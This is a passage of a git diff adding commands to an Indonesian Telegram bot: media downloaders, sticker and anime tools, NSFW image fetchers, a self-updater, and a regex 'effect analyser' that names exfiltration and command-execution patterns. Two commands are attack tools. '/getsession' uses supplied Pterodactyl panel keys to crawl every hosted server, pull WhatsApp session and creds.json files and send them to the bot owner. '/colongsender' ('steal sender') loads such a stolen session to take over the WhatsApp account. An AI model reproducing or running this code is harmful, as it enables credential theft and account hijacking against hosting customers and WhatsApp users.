+          await ctx.replyWithAudio(
+            { source: Buffer.from(result.data), filename: 'tiktok_audio.mp3' },
+            { title: 'TikTok Audio', performer: 'TikTok Downloader' }
+          );
+        } else {
+          await ctx.replyWithVideo(
+            { source: Buffer.from(result.data), filename: `tiktok_${type}.mp4` },
+            { 
+              supports_streaming: true,
+              caption: `✅ Berhasil diunduh\n📁 Tipe: ${getTypeName(type)}`
+            }
+          );
+        }
+        
+        // Hapus pesan status
+        await ctx.deleteMessage();
+        
+      } else {
+        await ctx.editMessageText(`❌ Gagal: ${result.error}`);
+      }
+      
+    } catch (error) {
+      await ctx.editMessageText(`❌ Error: ${error.message}`);
+    }
+  }
+
+});
+
+
+// AUTO UPDATE SPESIAL COY
+//KHUSUS PENGGUNAAN PANEL PTERODACTYL 
+// BY SANZOPE NO HAPUS CREDIT KONTOL
+// TYPE TELEGRAF
+const GH_OWNER = "balzyy21";
+const GH_REPO = "Update X-Slayer";
+const GH_BRANCH = "main";
+
+async function downloadRepo(dir = "", basePath = "/home/container") {
+    const url = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${dir}?ref=${GH_BRANCH}`;
+    const { data } = await axios.get(url, {
+        headers: {
+            "User-Agent": "Mozilla/5.0"
+        }
+    });
+
+    for (const item of data) {
+        const local = path.join(basePath, item.path);
+
+        if (item.type === "file") {
+            const fileData = await axios.get(item.download_url, { responseType: "arraybuffer" });
+            fs.mkdirSync(path.dirname(local), { recursive: true });
+            fs.writeFileSync(local, Buffer.from(fileData.data));
+            console.log("[UPDATE]", local);
+        }
+
+        if (item.type === "dir") {
+            fs.mkdirSync(local, { recursive: true });
+            await downloadRepo(item.path, basePath);
+        }
+    }
+}
+
+bot.command("update", checkPremium, async (ctx) => {
+    const chat = ctx.chat.id;
+    await ctx.reply("🔄 Sabar Lihat Update New");
+
+    try {
+        await downloadRepo("");
+        await ctx.reply("✅ Update selesai!\n🔁 Bot restart otomatis.");
+        setTimeout(() => process.exit(0), 1500);
+    } catch (e) {
+        await ctx.reply("❌ Gagal update, cek repo GitHub atau koneksi.");
+        console.log(e);
+    }
+});
+
+// spotifyplay
+bot.command("spotifyplay", checkPremium, async (ctx) => {
+  try {
+    const input = ctx.message.text.split(" ").slice(1).join(" ");
+    if (!input) {
+      return ctx.reply("❌ Masukkan judul lagu atau link Spotify.\n\nContoh:\n/spotifyplay Hadroh Ramadhan Tiba");
+    }
+
+    const loading = await ctx.reply("🔍 Mencari lagu...");
+
+    let spotifyUrl;
+
+    if (input.includes("open.spotify.com")) {
+      spotifyUrl = input;
+    }
+
+    else {
+      const search = await axios.get(
+        "https://ikyyzyyrestapi.my.id/search/spotify",
+        {
+          params: { query: input },
+          timeout: 60000
+        }
+      );
+
+      if (!search.data?.status || !search.data?.tracks?.length) {
+        await ctx.deleteMessage(loading.message_id).catch(() => {});
+        return ctx.reply("❌ Lagu tidak ditemukan.");
+      }
+
+      spotifyUrl = search.data.tracks[0].link;
+    }
+
+    const dl = await axios.get(
+      "https://ikyyzyyrestapi.my.id/download/spotifydl",
+      {
+        params: {
+          apikey: "kyzz",
+          url: spotifyUrl
+        },
+        timeout: 120000
+      }
+    );
+
+    await ctx.deleteMessage(loading.message_id).catch(() => {});
+
+    if (!dl.data?.status) {
+      return ctx.reply("❌ Gagal download lagu.");
+    }
+
+    const meta = dl.data.result.metadata;
+    const audioUrl = dl.data.result.download;
+
+    await ctx.replyWithPhoto(
+      { url: meta.img },
+      {
+        caption:
+`🎵 *${meta.song_name}*
+
+👤 Artist: ${meta.artist}
+💿 Album: ${meta.album_name}
+⏱ Durasi: ${meta.duration}
+📅 Rilis: ${meta.released}`,
+        parse_mode: "Markdown"
+      }
+    );
+
+    await ctx.replyWithAudio(
+      { url: audioUrl },
+      {
+        title: meta.song_name,
+        performer: meta.artist
+      }
+    );
+
+  } catch (err) {
+    console.error("Error SpotifyPlay:", err.response?.data || err.message || err);
+    ctx.reply("❌ Terjadi kesalahan saat memproses lagu.");
+  }
+});
+
+
+bot.command('iqc', async (ctx) => {
+  try {
+    const chatId = ctx.chat.id;
+
+    // Ambil text setelah command
+    const text = ctx.message.text.split(' ').slice(1).join(' ');
+
+    if (!text) {
+      return ctx.reply(
+        "⚠ Gunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`",
+        { parse_mode: "Markdown" }
+      );
+    }
+
+    let [time, battery, carrier, ...msgParts] = text.split("|");
+
+    if (!time || !battery || !carrier || msgParts.length === 0) {
+      return ctx.reply(
+        "⚠ Format salah!\nGunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`",
+        { parse_mode: "Markdown" }
+      );
+    }
+
+    await ctx.reply("⏳ Tunggu sebentar...");
+
+    const messageText = encodeURIComponent(msgParts.join("|").trim());
+
+    const url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(carrier)}&messageText=${messageText}&emojiStyle=apple`;
+
+    const res = await fetch(url);
+    if (!res.ok) {
+      return ctx.reply("❌ Gagal mengambil data dari API.");
+    }
+
+    const arrayBuffer = await res.arrayBuffer();
+    const buffer = Buffer.from(arrayBuffer);
+
+    await ctx.replyWithPhoto(
+      { source: buffer },
+      {
+        caption: "✅ Nih hasilnya",
+        parse_mode: "Markdown"
+      }
+    );
+
+  } catch (err) {
+    console.error(err);
+    ctx.reply("❌ Terjadi kesalahan saat menghubungi API.");
+  }
+});
+
+bot.command("videy", async (ctx) => {
+    const input = ctx.message.text.split(" ").slice(1).join(" ");
+    
+    if (!input || !input.startsWith("http")) {
+      return ctx.reply(
+        "❌ Kirim perintah dengan menyertakan URL video dari videy.co\nContoh: `/videydl https://videy.co/v?id=XXXX`",
+        { parse_mode: "Markdown" }
+      );
+    }
+
+    await ctx.reply("⏳ Sedang memproses video...");
+
+    try {
+      const res = await axios.post(
+        "https://fastapi.acodes.my.id/api/downloader/videy",
+        { text: input },
+        {
+          headers: {
+            accept: "*/*",
+            "Content-Type": "application/json",
+          },
+        }
+      );
+
+      if (res.data?.status && res.data?.data) {
+        await ctx.replyWithVideo(
+          { url: res.data.data },
+          { caption: "✅ Video berhasil diunduh dari videy.co!" }
+        );
+      } else {
+        await ctx.reply("❌ Gagal mendapatkan video. Coba cek ulang link-nya.");
+      }
+    } catch (err) {
+      console.error("VideyDL error:", err.message || err);
+      ctx.reply("❌ Terjadi kesalahan saat memproses video.");
+    }
+  });
+ 
+   bot.command("cekefek", async (ctx) => {
+  const reply = ctx.message.reply_to_message?.text;
+  if (!reply)
+    return ctx.reply("⚠️ Balas ke potongan kode yang ingin dianalisa dengan /efekfunc.");
+
+  await ctx.reply("🔎 Analisa cepat efek (simple) — tunggu sebentar...");
+
+  // Deteksi efek / pola berbahaya
+  let efek = "Tidak terdeteksi";
+  let indikator = "Tidak ditemukan";
+  let indikasiCuplikan = "";
+
+  if (/fetch|axios|http|https|socket|ws|wss/i.test(reply)) {
+    efek = "🌐 Exfiltrate / Network";
+    indikator = "Mengirim / menerima data jaringan.";
+  } else if (/crash|loop|repeat\(/i.test(reply)) {
+    efek = "💣 Crash / Overload";
+    indikator = "Loop besar atau operasi berat terdeteksi.";
+  } else if (/child_process|exec|spawn/i.test(reply)) {
+    efek = "⚙️ System Access / Command Injection";
+    indikator = "Menjalankan perintah sistem.";
+  } else if (/process\.kill|process\.exit/i.test(reply)) {
+    efek = "🧨 Process Kill Attempt";
+    indikator = "Upaya mematikan proses terdeteksi.";
+  } else if (/atob|btoa|Buffer\.from/i.test(reply)) {
+    efek = "🌀 Encoding / Obfuscation";
+    indikator = "Kode menyembunyikan data atau base64 decode/encode.";
+  }
+
+  // Ambil cuplikan indikasi
+  const lines = reply.split("\n");
+  const foundIndex = lines.findIndex((l) =>
+    l.match(/fetch|axios|http|repeat|exec|process|Buffer|btoa/i)
+  );
+  if (foundIndex >= 0) {
+    indikasiCuplikan = lines
+      .slice(Math.max(0, foundIndex - 1), foundIndex + 2)
+      .join("\n");
+  }
+
+  await ctx.replyWithMarkdown(
+    `🧠 *Analisa Efek (simple)*\n` +
+    `📂 *Sumber:* Potongan teks (reply)\n\n` +
+    `🔎 *Efek Teridentifikasi:* ${efek}\n` +
+    `🔎 *Indikator yang ditemukan:* ${indikator}\n\n` +
+    `📘 *Cuplikan (sekitar indikasi pertama):*\n\`\`\`js\n${indikasiCuplikan || "Tidak ditemukan indikasi mencurigakan"}\n\`\`\``
+  );
+});
+
+bot.command('denc', checkPremium, async (ctx) => {
+  if (!ctx.message.reply_to_message) return ctx.reply("🪧 ☇ Format: /decryptcode (reply javascript document)")
+  const replied = ctx.message.reply_to_message
+  if (!replied.document) return ctx.reply("❌ ☇ Pesan yang di reply bukan file")
+
+  const fileName = replied.document.file_name || 'file.js'
+  if (!fileName.endsWith('.js')) return ctx.reply("❌ ☇ File harus format .js")
+
+  const MAX = 8 * 1024 * 1024
+  if (replied.document.file_size > MAX) return ctx.reply("❌ ☇ File terlalu besar")
+
+  const processing = await ctx.reply(`✅ ☇ Mengunduh dan memproses dekripsi ${fileName}`)
+
+  try {
+    const fileLink = await ctx.telegram.getFileLink(replied.document.file_id)
+    const tmpDir = path.join(__dirname, 'temp')
+    if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir)
+
+    const tmpPath = path.join(tmpDir, fileName)
+    const resp = await axios({ url: fileLink.href, method: 'GET', responseType: 'stream' })
+    await pipeline(resp.data, createWriteStream(tmpPath))
+
+    let code = fs.readFileSync(tmpPath, 'utf8')
+    let deob = deobfuscatePipeline(code)
+
+    if (deob.length < code.length / 2 || /\\x[0-9A-Fa-f]{2}/.test(deob)) {
+      const dynamicPath = await deobfuscatePipelineDynamic(tmpPath)
+      deob = fs.readFileSync(dynamicPath, 'utf8')
+    }
+
+    const outPath = tmpPath.replace(/\.js$/, '_void_decrypt.js')
+    fs.writeFileSync(outPath, deob, 'utf8')
+
+    await ctx.telegram.editMessageText(ctx.chat.id, processing.message_id, undefined, `✅ ☇ Selesai di dekripsi sedang mengirim ${path.basename(outPath)}`)
+    await ctx.replyWithDocument({ source: outPath, filename: path.basename(outPath) })
+
+    try { fs.unlinkSync(tmpPath); fs.unlinkSync(outPath) } catch(e){}
+  } catch (err) {
+    await ctx.telegram.editMessageText(ctx.chat.id, processing.message_id, undefined, `❌ ☇ Gagal mendekripsi karena error: ${err.message}`)
+  }
+});
+
+bot.command("gethtml", async (ctx) => {
+  const chatId = ctx.chat.id;
+  const userId = ctx.from.id;
+  const url = ctx.message.text.split(' ')[1]; // Mengambil URL dari command
+
+  // Validasi URL
+  if (!url || !/^https?:\/\//i.test(url)) {
+    return ctx.reply("🔗 *Masukkan domain atau URL yang valid!*\n\nContoh:\n`/gethtml https://example.com`", {
+      parse_mode: "Markdown",
+    });
+  }
+
+  try {
+    await ctx.reply("⏳ Mengambil source code dari URL...");
+
+    const res = await fetch(url);
+    if (!res.ok) {
+      return ctx.reply("❌ *Gagal mengambil source code dari URL tersebut!*");
+    }
+
+    const html = await res.text();
+    const filePath = path.join(__dirname, "source_code.html");
+    fs.writeFileSync(filePath, html);
+
+    // Mengirim file sebagai document
+    await ctx.replyWithDocument({
+      source: filePath,
+      filename: "source_code.html",
+      contentType: "text/html"
+    });
+
+    fs.unlinkSync(filePath); // Hapus file setelah dikirim
+    
+  } catch (err) {
+    console.error(err);
+    ctx.reply(`❌ *Terjadi kesalahan:*\n\`${err.message}\``, {
+      parse_mode: "Markdown",
+    });
+  }
+});
+
+bot.command("brat", async (ctx) => {
+  const text = ctx.message.text.split(" ").slice(1).join(" ");
+  if (!text) return ctx.reply("Example\n/brat Reo Del Rey", { parse_mode: "Markdown" });
+
+  try {
+    // Kirim emoji reaksi manual
+    await ctx.reply("✨ Membuat stiker...");
+
+    const url = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=false`;
+    const response = await axios.get(url, { responseType: "arraybuffer" });
+
+    const filePath = path.join(__dirname, "brat.webp");
+    fs.writeFileSync(filePath, response.data);
+
+    await ctx.replyWithSticker({ source: filePath });
+
+    // Optional: hapus file setelah kirim
+    fs.unlinkSync(filePath);
+
+  } catch (err) {
+    console.error("Error brat:", err.message);
+    ctx.reply("❌ Gagal membuat stiker brat. Coba lagi nanti.");
+  }
+});
+
+bot.command(["ytsearch", "youtubesearch"], async (ctx) => {
+  const currentTime = Math.floor(Date.now() / 1000);
+  const messageTime = ctx.message.date;
+
+  if (currentTime - messageTime > 1) {
+    return;
+  }
+
+  if (groupOnlyMode && !isGroup(ctx)) {
+    return ctx.reply("bot hanya dapat digunakan didalam grup");
+  }
+
+  const text = ctx.message.text.split(" ").slice(1).join(" ");
+  if (!text) return ctx.reply("Masukkan query parameters!");
+
+  ctx.reply("🔍 Sedang mencari...");
+
+  try {
+    const anu = `https://api.diioffc.web.id/api/search/ytplay?query=${encodeURIComponent(
+      text
+    )}`;
+    const { data: response } = await axios.get(anu);
+
+    const url = response.result.url;
+    const caption = `🎵 Title: ${response.result.title}\n📜 Description: ${response.result.description}\n👀 Views: ${response.result.views}`;
+
+    ctx.reply(caption, {
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: "Download MP3", callback_data: `ytmp3 ${url}` }],
+          [{ text: "Download MP4", callback_data: `ytmp4 ${url}` }],
+        ],
+      },
+    });
+  } catch (e) {
+    console.error(e);
+    ctx.reply("❌ Terjadi kesalahan!");
+  }
+});
+
+bot.command("getsession", checkPremium, async (ctx) => {
+  const chatId = ctx.chat.id;
+  const fromId = ctx.from.id;
+
+  const text = ctx.message.text.split(" ").slice(1).join(" ");
+  if (!text) return ctx.reply("🪧 ☇ Format: /getsession https://domainpanel.com,ptla_123,ptlc_123");
+
+  const args = text.split(",");
+  const domain = args[0];
+  const plta = args[1];
+  const pltc = args[2];
+  if (!plta || !pltc)
+    return ctx.reply("🪧 ☇ Format: /csessions https://panelku.com,plta_123,pltc_123");
+
+  await ctx.reply(
+    "⏳ ☇ Sedang scan semua server untuk mencari folder sessions dan file creds.json",
+    { parse_mode: "Markdown" }
+  );
+
+  const base = domain.replace(/\/+$/, "");
+  const commonHeadersApp = {
+    Accept: "application/json, application/vnd.pterodactyl.v1+json",
+    Authorization: `Bearer ${plta}`,
+  };
+  const commonHeadersClient = {
+    Accept: "application/json, application/vnd.pterodactyl.v1+json",
+    Authorization: `Bearer ${pltc}`,
+  };
+
+  function isDirectory(item) {
+    if (!item || !item.attributes) return false;
+    const a = item.attributes;
+    if (typeof a.is_file === "boolean") return a.is_file === false;
+    return (
+      a.type === "dir" ||
+      a.type === "directory" ||
+      a.mode === "dir" ||
+      a.mode === "directory" ||
+      a.mode === "d" ||
+      a.is_directory === true ||
+      a.isDir === true
+    );
+  }
+
+  async function listAllServers() {
+    const out = [];
+    let page = 1;
+    while (true) {
+      const r = await axios.get(`${base}/api/application/servers`, {
+        params: { page },
+        headers: commonHeadersApp,
+        timeout: 15000,
+      }).catch(() => ({ data: null }));
+      const chunk = (r && r.data && Array.isArray(r.data.data)) ? r.data.data : [];
+      out.push(...chunk);
+      const hasNext = !!(r && r.data && r.data.meta && r.data.meta.pagination && r.data.meta.pagination.links && r.data.meta.pagination.links.next);
+      if (!hasNext || chunk.length === 0) break;
+      page++;
+    }
+    return out;
+  }
+
+  async function traverseAndFind(identifier, dir = "/") {
+    try {
+      const listRes = await axios.get(
+        `${base}/api/client/servers/${identifier}/files/list`,
+        {
+          params: { directory: dir },
+          headers: commonHeadersClient,
+          timeout: 15000,
+        }
+      ).catch(() => ({ data: null }));
+      const listJson = listRes.data;
+      if (!listJson || !Array.isArray(listJson.data)) return [];
+      let found = [];
+
+      for (let item of listJson.data) {
+        const name = (item.attributes && item.attributes.name) || item.name || "";
+        const itemPath = (dir === "/" ? "" : dir) + "/" + name;
+        const normalized = itemPath.replace(/\/+/g, "/");
+        const lower = name.toLowerCase();
+
+        if ((lower === "session" || lower === "sessions") && isDirectory(item)) {
+          try {
+            const sessRes = await axios.get(
+              `${base}/api/client/servers/${identifier}/files/list`,
+              {
+                params: { directory: normalized },
+                headers: commonHeadersClient,
+                timeout: 15000,
+              }
+            ).catch(() => ({ data: null }));
+            const sessJson = sessRes.data;
+            if (sessJson && Array.isArray(sessJson.data)) {
+              for (let sf of sessJson.data) {
+                const sfName = (sf.attributes && sf.attributes.name) || sf.name || "";
+                const sfPath = (normalized === "/" ? "" : normalized) + "/" + sfName;
+                if (sfName.toLowerCase() === "sension, sensions") {
+                  found.push({
+                    path: sfPath.replace(/\/+/g, "/"),
+                    name: sfName,
+                  });
+                }
+              }
+            }
+          } catch (_) {}
+        }
+
+        if (isDirectory(item)) {
+          try {
+            const more = await traverseAndFind(identifier, normalized === "" ? "/" : normalized);
+            if (more.length) found = found.concat(more);
+          } catch (_) {}
+        } else {
+          if (name.toLowerCase() === "sension, sensions") {
+            found.push({ path: (dir === "/" ? "" : dir) + "/" + name, name });
+          }
+        }
+      }
+      return found;
+    } catch (_) {
+      return [];
+    }
+  }
+
+  try {
+    const servers = await listAllServers();
+    if (!servers.length) {
+      return ctx.reply("❌ ☇ Tidak ada server yang bisa discan");
+    }
+
+    let totalFound = 0;
+
+    for (let srv of servers) {
+      const identifier =
+        (srv.attributes && srv.attributes.identifier) ||
+        srv.identifier ||
+        (srv.attributes && srv.attributes.id);
+      const name =
+        (srv.attributes && srv.attributes.name) ||
+        srv.name ||
+        identifier ||
+        "unknown";
+      if (!identifier) continue;
+
+      const list = await traverseAndFind(identifier, "/");
+      if (list && list.length) {
+        for (let fileInfo of list) {
+          totalFound++;
+          const filePath = ("/" + fileInfo.path.replace(/\/+/g, "/")).replace(/\/+$/,"");
+
+          await ctx.reply(
+            `📁 ☇ Ditemukan sension di server ${name} path: ${filePath}`,
+            { parse_mode: "Markdown" }
+          );
+
+          try {
+            const downloadRes = await axios.get(
+              `${base}/api/client/servers/${identifier}/files/download`,
+              {
+                params: { file: filePath },
+                headers: commonHeadersClient,
+                timeout: 15000,
+              }
+            ).catch(() => ({ data: null }));
+
+            const dlJson = downloadRes && downloadRes.data;
+            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
+              const url = dlJson.attributes.url;
+              const fileRes = await axios.get(url, {
+                responseType: "arraybuffer",
+                timeout: 20000,
+              });
+              const buffer = Buffer.from(fileRes.data);
+              await ctx.telegram.sendDocument(ownerID, {
+                source: buffer,
+                filename: `${String(name).replace(/\s+/g, "_")}_sensions`,
+              });
+            } else {
+              await ctx.reply(
+                `❌ ☇ Gagal mendapatkan URL download untuk ${filePath} di server ${name}`
+              );
+            }
+          } catch (e) {
+            console.error(`Gagal download ${filePath} dari ${name}:`, e?.message || e);
+            await ctx.reply(
+              `❌ ☇ Error saat download file creds.json dari ${name}`
+            );
+          }
+        }
+      }
+    }
+
+    if (totalFound === 0) {
+      return ctx.reply("✅ ☇ Scan selesai tidak ditemukan creds.json di folder session/sessions pada server manapun");
+    } else {
+      return ctx.reply(`✅ ☇ Scan selesai total file creds.json berhasil diunduh & dikirim: ${totalFound}`);
+    }
+  } catch (err) {
+    ctx.reply("❌ ☇ Terjadi error saat scan");
+  }
+});
+
+bot.command("getnsfw", checkPremium, async (ctx) => {
+  try {
+    const nsfwTypes = [
+      "hentai", "ass", "boobs", "paizuri", "thigh",
+      "hanal", "hass", "pgif", "4k", "lewdneko", "lewdkitsune"
+    ];
+    
+    const randomType = nsfwTypes[Math.floor(Math.random() * nsfwTypes.length)];
+
+    const res = await fetchJsonHttps(`https://nekobot.xyz/api/image?type=${randomType}`);
+    
+    if (res && res.message) {
+      await ctx.replyWithVideo(res.message, {
+        caption: `✅ ☇ Gambar berhasil dibuat`
+      });
+    } else {
+      ctx.reply("❌ ☇ Gagal membuat gambar");
+    }
+  } catch (err) {
+    ctx.reply("❌ ☇ Terjadi kesalahan saat memuat gambar");
+  }
+});
+
+bot.command("nsfwwaifu", checkPremium, async (ctx) => {
+    // Hanya untuk pengguna premium
+    const category = ctx.message.text.split(" ")[1] || "waifu";
+
+    const validCategories = ['waifu', 'neko', 'trap', 'blowjob'];
+    
+    if (!validCategories.includes(category)) {
+        return ctx.reply("❌ ☇ Kategori NSFW tidak valid");
+    }
+
+    try {
+        const response = await axios.get(`https://api.waifu.pics/nsfw/${category}`);
+        
+        await ctx.replyWithVideo(response.data.url, {
+            caption: `<blockquote><b>⬡═―—⊱ ⎧ NSFW WAIFU ⎭ ⊰―—═⬡</b></blockquote>🔞 Kategori: ${category}\n\n⚠️ Konten untuk dewasa`,
+            parse_mode: "HTML"
+        });
+    } catch (error) {
+        await ctx.reply("❌ ☇ Gagal mengambil gambar NSFW");
+    }
+});
+
+bot.command("waifu", checkPremium, async (ctx) => {
+    const category = ctx.message.text.split(" ")[1] || "waifu";
+
+    const validCategories = ['waifu', 'neko', 'shinobu', 'megumin', 'bully', 'cuddle', 'cry', 'hug', 'awoo', 'kiss', 'lick', 'pat', 'smug', 'bonk', 'yeet', 'blush', 'smile', 'wave', 'highfive', 'handhold', 'nom', 'bite', 'glomp', 'slap', 'kill', 'kick', 'happy', 'wink', 'poke', 'dance', 'cringe'];
+    
+    if (!validCategories.includes(category)) {
+        return ctx.reply(`❌ ☇ Kategori tidak valid. Kategori yang tersedia: ${validCategories.slice(0, 10).join(', ')}...`);
+    }
+
+    try {
+        const response = await axios.get(`https://api.waifu.pics/sfw/${category}`);
+        
+        await ctx.replyWithVideo(response.data.url, {
+            caption: `<blockquote><b>⬡═―—⊱ ⎧ WAIFU IMAGE ⎭ ⊰―—═⬡</b></blockquote>🌸 Kategori: ${category}`,
+            parse_mode: "HTML"
+        });
+    } catch (error) {
+        await ctx.reply("❌ ☇ Gagal mengambil gambar waifu");
+    }
+});
+
+bot.command('iqc', async (ctx) => {
+  try {
+    const args = ctx.message.text.split(' ').slice(1);
+    if (args.length < 3) {
+      return ctx.reply('Gunakan format:\n/iqc <pesan> <baterai> <operator>\n\nContoh:\n/iphone Halo dunia 87 Telkomsel');
+    }
+
+    // Gabung argumen, misalnya: [ 'Halo', 'dunia', '87', 'Telkomsel' ]
+    const battery = args[args.length - 2];       // misal 87
+    const carrier = args[args.length - 1];       // misal Telkomsel
+    const text = args.slice(0, -2).join(' ');    // sisanya jadi pesan
+    const time = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });
+
+    await ctx.reply('⏳ Membuat quoted message gaya iPhone...');
+
+    // 🔗 Build API URL
+    const apiUrl = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&messageText=${encodeURIComponent(text)}&carrierName=${encodeURIComponent(carrier)}&batteryPercentage=${encodeURIComponent(battery)}&signalStrength=4&emojiStyle=apple`;
+
+    // Ambil hasil gambar dari API
+    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
+    const buffer = Buffer.from(response.data, 'binary');
+
+    // Kirim gambar hasil API ke user
+    await ctx.replyWithPhoto({ source: buffer }, { caption: `📱 iPhone quote dibuat!\n🕒 ${time}` });
+  } catch (err) {
+    console.error('❌ Error case /iqc:', err);
+    await ctx.reply('Terjadi kesalahan saat memproses gambar.');
+  }
+});
+
+bot.command('colongsender', async (ctx) => {
+  const msg = ctx.message;
+  const chatId = msg.chat.id;
+  
+  if (!isOwner(msg)) return ctx.reply('❌ Khusus owner we.');
+
+  const doc = msg.reply_to_message?.document;
+  if (!doc) return ctx.reply('❌ Balas file session atau creds.json + dengan /colongsender');
+
+  const name = doc.file_name.toLowerCase();
+  if (!['.json','.zip','.tar','.tar.gz','.tgz'].some(ext => name.endsWith(ext)))
+    return ctx.reply('❌ File bukan session tolol.');
+
+  await ctx.reply('🔄 Proses colong sender in you session…');
+
+  const url = await bot.getFileLink(doc.file_id);
+  const { data } = await axios.get(url, { responseType: 'arraybuffer' });
+  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'sess-'));
+
+  if (name.endsWith('.json')) {
+    await fs.writeFile(path.join(tmp, 'creds.json'), data);
+  } else if (name.endsWith('.zip')) {
+    new AdmZip(data).extractAllTo(tmp, true);
+  } else {
+    const tmpTar = path.join(tmp, name);
+    await fs.writeFile(tmpTar, data);
+    await tar.x({ file: tmpTar, cwd: tmp });
+  }
+
+  const credsPath = await findCredsFile(tmp);
+  if (!credsPath) return ctx.reply('❌ creds.json tidak ditemukan bego');
+
+  const creds = await fs.readJson(credsPath);
+  const botNumber = creds.me.id.split(':')[0];
+
+  await fs.remove(destDir);
+  await fs.copy(tmp, destDir);
+  saveActiveSessions(botNumber);
+
+  const auth = await useMultiFileAuthState(destDir);
+  await connectToWhatsApp(botNumber, chatId, auth);
+
+  return ctx.reply(`*SUCCES CONNECTING🫀*
+  NUMBER : ${botNumber}
+  *ANJAYYY KEMALING🗿*`);
+});
+
+bot.command("waifu", checkPremium, async (ctx) => {
+    const category = ctx.message.text.split(" ")[1] || "waifu";
+
+    const validCategories = ['waifu', 'neko', 'shinobu', 'megumin', 'bully', 'cuddle', 'cry', 'hug', 'awoo', 'kiss', 'lick', 'pat', 'smug', 'bonk', 'yeet', 'blush', 'smile', 'wave', 'highfive', 'handhold', 'nom', 'bite', 'glomp', 'slap', 'kill', 'kick', 'happy', 'wink', 'poke', 'dance', 'cringe'];
+    
+    if (!validCategories.includes(category)) {
+        return ctx.reply(`❌ ☇ Kategori tidak valid. Kategori yang tersedia: ${validCategories.slice(0, 10).join(', ')}...`);
+    }
+
+    try {
+        const response = await axios.get(`https://api.waifu.pics/sfw/${category}`);
+        
+        await ctx.replyWithVideo(response.data.url, {
+            caption: `<blockquote><b>⬡═―—⊱ ⎧ WAIFU IMAGE ⎭ ⊰―—═⬡</b></blockquote>🌸 Kategori: ${category}`,
+            parse_mode: "HTML"
+        });
+    } catch (error) {
+        await ctx.reply("❌ ☇ Gagal mengambil gambar waifu");
+    }
+});
+
+bot.command("anime", checkPremium, async (ctx) => {
+    const query = ctx.message.text.split(" ").slice(1).join(" ");
+    if (!query) return ctx.reply("👀 ☇ Format: /anime <judul anime>");
+
+    const waitMsg = await ctx.reply("⏳ ☇ Mencari anime...");
+
+    try {
+        const response = await axios.get(`https://api.jikan.moe/v4/anime?q=${encodeURIComponent(query)}&limit=5`);
+        
+        if (!response.data.data || response.data.data.length === 0) {
+            await ctx.reply("❌ ☇ Anime tidak ditemukan");
+            return;
+        }
+
+        const anime = response.data.data[0];
+        const caption = `
+<blockquote><b>⬡═―—⊱ ⎧ ANIME INFO ⎭ ⊰―—═⬡</b></blockquote>
+🎬 <b>${anime.title}</b>
+${anime.title_japanese ? `📝 ${anime.title_japanese}\n` : ''}
+⭐ Rating: ${anime.score || 'N/A'}
+📊 Status: ${anime.status}
+📅 Episode: ${anime.episodes || 'Ongoing'}
+🎭 Type: ${anime.type}
+📺 Source: ${anime.source}
+
+📖 <b>Sinopsis:</b>
+${anime.synopsis ? anime.synopsis.substring(0, 500) + '...' : 'Tidak tersedia'}
+
+🔗 <a href="${anime.url}">MyAnimeList</a>`;
+
+        await ctx.replyWithVideo(anime.images.jpg.large_image_url, {
+            caption: caption,
+            parse_mode: "HTML",
+            disable_web_page_preview: true
+        });
+
+    } catch (error) {
+        await ctx.reply("❌ ☇ Gagal mencari anime");
+    } finally {
+        try { await ctx.deleteMessage(waitMsg.message_id); } catch {}
+    }
+});
+
+
+bot.command("cekbiotele", async (ctx) => {
+    const args = ctx.message.text.split(" ").slice(1);
+    
+    if (args.length < 1 && !ctx.message.reply_to_message) {
+        return ctx.reply("📝 Format: /cekbio <username|user_id|reply>\nContoh: /cekbio @username\n/cekbio 123456789\n/cekbio [reply user]");
+    }
+
+    let targetUser;
+    const processMsg = await ctx.reply("⏳ Mengambil informasi bio...");
+
+    try {
+        // Determine target user
+        if (ctx.message.reply_to_message) {
+            targetUser = ctx.message.reply_to_message.from;
+        } else if (args[0].startsWith('@')) {
+            const username = args[0].slice(1);
+            targetUser = await ctx.telegram.getChat(`@${ctx.from.first_name}`);
+        } else {
+            const userId = parseInt(args[0]);
+            if (isNaN(userId)) {
+                await ctx.editMessageText("❌ User ID atau username tidak valid", {
+                    chat_id: ctx.chat.id,
+                    message_id: processMsg.message_id
+                });
+                return;
+            }
+            targetUser = await ctx.telegram.getChat(userId);
+        }
+
+        // Get user profile photos for avatar
+        const profilePhotos = await ctx.telegram.getUserProfilePhotos(targetUser.id, 0, 1);
+        
+        // Get full user info
+        const userInfo = await formatUserBio(targetUser, profilePhotos);
+
+        // Send result
+        if (profilePhotos.total_count > 0) {
+            const photoFile = await ctx.telegram.getFile(profilePhotos.photos[0][0].file_id);
+            const thumbnailUrl = `https://api.telegram.org/file/bot${ctx.telegram.token}/${photoFile.file_path}`;
+            
+            await ctx.replyWithPhoto(thumbnailUrl, {
+                caption: userInfo,
+                parse_mode: "HTML",
+                reply_markup: {
+                    inline_keyboard: [
+                        [{ text: "📊 Info Lengkap", callback_data: `fullinfo_${targetUser.id}` }],
+                        [{ text: "🔄 Scan Ulang", callback_data: `rescan_bio_${targetUser.id}` }]
+                    ]
+                }
+            });
+        } else {
+            await ctx.reply(userInfo, {
+                parse_mode: "HTML",
+                reply_markup: {
+                    inline_keyboard: [
+                        [{ text: "📊 Info Lengkap", callback_data: `fullinfo_${targetUser.id}` }]
+                    ]
+                }
+            });
+        }
+
+        await ctx.deleteMessage(processMsg.message_id);
+
+    } catch (error) {
+        console.error("Bio check error:", error);
+        await ctx.editMessageText("❌ Gagal mengambil informasi user. Pastikan username/userID valid dan user tidak di-private.", {
+            chat_id: ctx.chat.id,
+            message_id: processMsg.message_id
+        });
+    }
+});
+
+bot.command("cekbio", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
